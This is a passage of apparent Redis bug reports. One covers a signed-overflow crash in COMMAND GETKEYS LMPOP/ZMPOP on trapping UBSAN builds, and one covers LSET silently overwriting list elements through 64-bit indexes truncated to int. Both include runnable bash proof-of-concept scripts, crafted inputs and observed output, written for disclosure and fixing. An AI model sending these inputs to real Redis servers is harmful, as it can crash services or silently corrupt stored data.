WORK="$(mktemp -d)"; ERR="$WORK/server.err"; PIDF="$WORK/server.pid"

# --- locate or build a genuinely-trapping UBSAN server ---
SERVER="${REDIS_UBSAN_SERVER:-}"
if [ -z "$SERVER" ]; then
  for cand in src/redis-server-trapubsan src/redis-server-ubsan; do
    [ -x "$cand" ] && { SERVER="$cand"; break; }
  done
fi
if [ -z "$SERVER" ] || ! "$SERVER" --version >/dev/null 2>&1; then
  echo "No trapping UBSAN server found; building one (non-LTO, ~2-3 min)..."
  make SANITIZER=undefined OPTIMIZATION=-O2 MALLOC=libc BUILD_TLS=no -j"$(nproc)" >/dev/null 2>&1 \
    || { echo "build failed"; exit 1; }
  SERVER="src/redis-server"
  echo "built $SERVER"
fi
CLI="src/redis-cli"; [ -x "$CLI" ] || CLI="$(command -v redis-cli)"

cleanup() { [ -f "$PIDF" ] && kill -9 "$(cat "$PIDF")" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT

"$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
          --logfile /dev/stderr --pidfile "$PIDF" >"$ERR" 2>&1 &
SRV=$!
for i in $(seq 1 80); do "$CLI" -p "$PORT" PING >/dev/null 2>&1 && break; sleep 0.1; done
echo "ping before: $("$CLI" -p "$PORT" PING 2>&1)"
echo
echo "=== triggering signed overflow at src/db.c:3226 ==="
echo "  LMPOP reply: $("$CLI" -p "$PORT" COMMAND GETKEYS LMPOP 9223372036854775807 k LEFT 2>&1)"
# If the first probe aborted the server, this one will show a connection error (also evidence of the abort).
echo "  ZMPOP reply: $("$CLI" -p "$PORT" COMMAND GETKEYS ZMPOP 9223372036854775807 z MIN 2>&1)"
echo
if kill -0 "$SRV" 2>/dev/null; then
  echo "VERDICT: server ALIVE — build is in UBSAN *recover* mode (UB reported, no DoS)."
  echo "         (This is the repo default 'make SANITIZER=undefined' LTO behavior; run a non-LTO/"
  echo "          no-recover build to see the abort — set \$REDIS_UBSAN_SERVER to one.)"
else
  echo "VERDICT: server ABORTED — trapping UBSAN DoS reproduced."
fi
echo
echo "=== UBSAN diagnostics from server stderr ==="
grep -vE 'overcommit|Redis is starting|Redis version|Configuration loaded|monotonic|Running mode|Server init|Ready to accept|WARNING: Redis' "$ERR" 2>/dev/null | head -20
```

Observed output with a trapping (non-LTO) UBSAN server:

```text
ping before: PONG

=== triggering signed overflow at src/db.c:3226 ===
  LMPOP reply: Error: Server closed the connection
  ZMPOP reply: Could not connect to Redis at 127.0.0.1:17923: Connection refused

VERDICT: server ABORTED — trapping UBSAN DoS reproduced.

=== UBSAN diagnostics from server stderr ===
db.c:3226:18: runtime error: signed integer overflow: 2 + 9223372036854775806 cannot be represented in type 'long int'
```

For reference, on the **default stock build** the same input is safely rejected (no crash):

```text
  LMPOP reply: ERR Invalid arguments specified for command
  ZMPOP reply: ERR Invalid arguments specified for command
  server alive after: PONG
```

## Expected behavior

`COMMAND GETKEYS LMPOP 9223372036854775807 k LEFT` (declaring `LONG_MAX` keys but supplying one) must be rejected as a syntax error ("Invalid arguments specified for command") **without performing undefined arithmetic**, and a trapping/hardened build must not abort. The validity check should run on overflow-safe values, or `numkeys` should be bounded against the remaining argument count before the `last` computation.

## Additional information

- **Sink:** `src/db.c:3226` (`last = first + ((long)numkeys - 1) * step;`), inside `getKeysUsingKeySpecs()`. Reached via `src/server.c:5731` (`COMMAND GETKEYS` → `getKeysFromCommandWithSpecs`). Also reachable at real command dispatch in **cluster mode**, where slot computation calls key-spec extraction before the handler runs.
- **Verified:** commit `d28dd44c4`, 64-bit Linux/GCC 9.4 (`malloc=libc bits=64`). Both `LMPOP` and `ZMPOP` produce the identical UBSAN diagnostic. Abort reproduced on a non-LTO trapping UBSAN build (`OPTIMIZATION=-O2`); default stock build and the repo's default LTO `SANITIZER=undefined` build do not crash (stock rejects cleanly; LTO UBSAN recovers).
- **Affected commands:** every `KSPEC_FK_KEYNUM` key-spec command (LMPOP, ZMPOP, BLMPOP, BZMPOP, EVAL, EVALSHA, FCALL, SINTERCARD, ZINTER, ZUNION, ZDIFF and store variants). For LMPOP/ZMPOP (`step == 1`) the single overflowing value is `numkeys == LONG_MAX`; commands with `step > 1` overflow at smaller `numkeys`.
- **Suggested fix (runtime):** in the `KSPEC_FK_KEYNUM` branch, reject `numkeys` values that would overflow `last` *before* computing it — e.g. guard `numkeys - 1 > (LONG_MAX - first) / step`, or use `__builtin_mul_overflow`/`__builtin_add_overflow`. Additionally bounding `numkeys` against the remaining argument count is the simplest correct gate.

title: [BUG] LSET overwrites list elements via out-of-range 64-bit indexes (long→int truncation)
author: sdjasj
body:
## Describe the bug

`LSET key index value` parses `index` from the client argument as a C `long` (64-bit on Linux x86-64), but hands it to the shared replacement helper `listTypeReplaceAtIndex(robj *o, int index, ...)`, whose `index` parameter is only an `int` (32-bit). When the caller and callee have mismatched integer widths, the value is silently narrowed at the call site: an index that is perfectly representable as a `long` but falls outside the 32-bit `int` range is truncated to its low 32 bits.

Concretely, `4294967296` (`2^32`) is truncated to `0`, and `4294967298` (`2^32 + 2`) is truncated to `2`. These indexes are all logically out of range for any realistic list and must be rejected with `ERR index out of range`. Instead `LSET` replies `OK` and **silently overwrites an existing element at the truncated index**. The negative analog `-4294967296` also truncates to `0` on the verified 64-bit build and overwrites the head element.

This is an authenticated, remote, data-integrity issue reachable through an ordinary runtime command. It affects both list encodings:

- listpack branch (`lpSeek(o->ptr, index)`), and
- quicklist branch (`quicklistReplaceAtIndex(ql, index, vstr, vlen)`).

The truncation happens before either encoding path is reached, so both are equally affected.

Vulnerable code (current `unstable`, commit `d28dd44c4`):

```c
/* src/t_list.c:641 — caller parses index as `long` */
void lsetCommand(client *c) {
    kvobj *o = lookupKeyWriteOrReply(c, c->argv[1], shared.nokeyerr);
    if (o == NULL || checkType(c,o,OBJ_LIST)) return;
    long index;                                   /* 64-bit on Linux x86-64 */
    robj *value = c->argv[3];
    ...
    if ((getLongFromObjectOrReply(c, c->argv[2], &index, NULL) != C_OK))
        return;
    ...
    if (listTypeReplaceAtIndex(o, index, value)) {  /* <-- long narrowed to int here */
        addReply(c, shared.ok);
        ...
    } else {
        addReplyErrorObject(c, shared.outofrangeerr);
    }
}

/* src/t_list.c:373 — callee accepts index as `int` */
int listTypeReplaceAtIndex(robj *o, int index, robj *value) {   /* 32-bit parameter */
    ...
    if (o->encoding == OBJ_ENCODING_QUICKLIST) {
        quicklist *ql = o->ptr;
        replaced = quicklistReplaceAtIndex(ql, index, vstr, vlen);   /* truncated index */
    } else if (o->encoding == OBJ_ENCODING_LISTPACK) {
        unsigned char *p = lpSeek(o->ptr, index);                    /* truncated index */
        if (p) {
            o->ptr = lpReplace(o->ptr, &p, (unsigned char *)vstr, vlen);
            replaced = 1;
        }
    }
    ...
}
```

## To reproduce

The following block is a self-contained, copy-paste-runnable PoC. It launches a throwaway `redis-server` on a high port with persistence disabled, exercises `LSET` with truncating indexes against both listpack- and quicklist-encoded lists, prints `OK`/`FAIL` checks against the *expected* (out-of-range) behavior, and tears the server down on exit.

> Requirements: a build of the vulnerable Redis available either as `redis-server`/`redis-cli` on `PATH`, or at `./src/redis-server` / `./src/redis-cli` (e.g. run `make` in a checkout, then run this snippet from the repo root). Verified on commit `d28dd44c4`, 64-bit Linux GCC build (`arch_bits:64`).

```bash
#!/usr/bin/env bash
# LSET long->int index truncation PoC — fully self-contained, copy/paste runnable.
set -u
PORT=17899
WORK="$(mktemp -d)"
REDIS_SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
REDIS_CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"

cleanup() {
  "${REDIS_CLI}" -p "${PORT}" SHUTDOWN NOSAVE >/dev/null 2>&1 || true
  sleep 0.2
  rm -rf "${WORK}"
}
trap cleanup EXIT

"${REDIS_SERVER}" --port "${PORT}" --save "" --appendonly no --daemonize yes \
                  --dir "${WORK}" --logfile "${WORK}/redis.log"
sleep 0.5
"${REDIS_CLI}" -p "${PORT}" PING >/dev/null || { echo "could not reach redis-server"; exit 2; }

fail=0
check() {  # check <label> <actual> <expected>
  if [ "$2" = "$3" ]; then printf '  [ok]   %-34s got %s\n' "$1" "$2";
  else printf '  [FAIL] %-34s got %s, expected %s\n' "$1" "$2" "$3"; fail=1; fi
}

echo "=== Redis build info ==="
"${REDIS_CLI}" -p "${PORT}" INFO server | grep -E '^(redis_version|redis_git_sha1|arch_bits):'

echo; echo "=== listpack-encoded list, length 3 ==="
"${REDIS_CLI}" -p "${PORT}" DEL lp >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp a b c >/dev/null
# 4294967296 = 2^32  -> truncates to 0  (should be OUT OF RANGE)
check "LSET lp 4294967296 X reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp 4294967296 X)" "ERR index out of range"
check "lp unchanged (a,b,c)" \
      "$("${REDIS_CLI}" -p "${PORT}" LRANGE lp 0 -1 | tr '\n' ',')" "a,b,c,"
# 4294967298 = 2^32 + 2 -> truncates to 2 (should be OUT OF RANGE)
"${REDIS_CLI}" -p "${PORT}" DEL lp2 >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp2 a b c >/dev/null
check "LSET lp2 4294967298 Z reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp2 4294967298 Z)" "ERR index out of range"
check "lp2 unchanged (a,b,c)" \
      "$("${REDIS_CLI}" -p "${PORT}" LRANGE lp2 0 -1 | tr '\n' ',')" "a,b,c,"
# -4294967296 = -2^32 -> truncates to 0 (should be OUT OF RANGE)
"${REDIS_CLI}" -p "${PORT}" DEL lp3 >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp3 a b c >/dev/null
check "LSET lp3 -4294967296 NEG reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp3 -4294967296 NEG)" "ERR index out of range"

echo; echo "=== quicklist-encoded list (multi-node) ==="
"${REDIS_CLI}" -p "${PORT}" CONFIG SET list-max-listpack-size 1 >/dev/null   # force small nodes
"${REDIS_CLI}" -p "${PORT}" DEL ql >/dev/null
for i in $(seq 1 300); do \
  "${REDIS_CLI}" -p "${PORT}" RPUSH ql "padding-padding-padding-padding-$i" >/dev/null; done
printf '  encoding: %s\n' "$("${REDIS_CLI}" -p "${PORT}" OBJECT ENCODING ql)"
before="$("${REDIS_CLI}" -p "${PORT}" LINDEX ql 2)"
check "LSET ql 4294967298 ZZZ reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET ql 4294967298 ZZZ)" "ERR index out of range"
check "ql elem[2] unchanged" "$("${REDIS_CLI}" -p "${PORT}" LINDEX ql 2)" "${before}"
check "ql length unchanged"  "$("${REDIS_CLI}" -p "${PORT}" LLEN ql)" "300"

echo; echo "=== sanity: genuinely out-of-range index is still rejected ==="
check "LSET lp 9999999999 reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp 9999999999 NOPE)" "ERR index out of range"

echo; echo "=== verdict ==="
if [ $fail -eq 0 ]; then
  echo "ALL CHECKS PASSED — bug NOT present on this build."; exit 0
else
  echo "BUG PRESENT — out-of-range long indexes were accepted and truncated to in-range int indexes."; exit 1
fi
```

Observed output on the vulnerable build (commit `d28dd44c4`, `arch_bits:64`). The expected reply in every `LSET` line is `ERR index out of range`; instead the server replies `OK` and the targeted element is overwritten:

```text
=== listpack-encoded list, length 3 ===
  [FAIL] LSET lp 4294967296 X reply           got OK, expected ERR index out of range
  [FAIL] lp unchanged (a,b,c)                 got X,b,c,, expected a,b,c,        # index 0 overwritten
  [FAIL] LSET lp2 4294967298 Z reply          got OK, expected ERR index out of range
  [FAIL] lp2 unchanged (a,b,c)               got a,b,Z,, expected a,b,c,        # index 2 overwritten
  [FAIL] LSET lp3 -4294967296 NEG reply       got OK, expected ERR index out of range
=== quicklist-encoded list (multi-node) ===
  encoding: quicklist
  [FAIL] LSET ql 4294967298 ZZZ reply       got OK, expected ERR index out of range
  [FAIL] ql elem[2] unchanged               got ZZZ, expected padding-padding-padding-padding-3
  [ok]   ql length unchanged                got 300                               # length intact => a replace, not an append
=== sanity: genuinely out-of-range index is still rejected ===
  [ok]   LSET lp 9999999999 reply             got ERR index out of range
=== verdict ===
BUG PRESENT — out-of-range long indexes were accepted and truncated to in-range int indexes.
```

Equivalent bare `redis-cli` commands reproducing the core issue on a fresh `RPUSH k a b c`:

```text
LSET k 4294967296 X      -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> X b c   (index 0 overwritten)
LSET k 4294967298 Z      -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> a b Z   (index 2 overwritten)
LSET k -4294967296 NEG   -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> NEG b c (index 0 overwritten)
LSET k 9999999999 NOPE   -> ERR index out of range   (sanity: this one *is* rejected, because 9999999999 mod 2^32 == 1410065407, still out of range for a 3-element list)
```

## Expected behavior
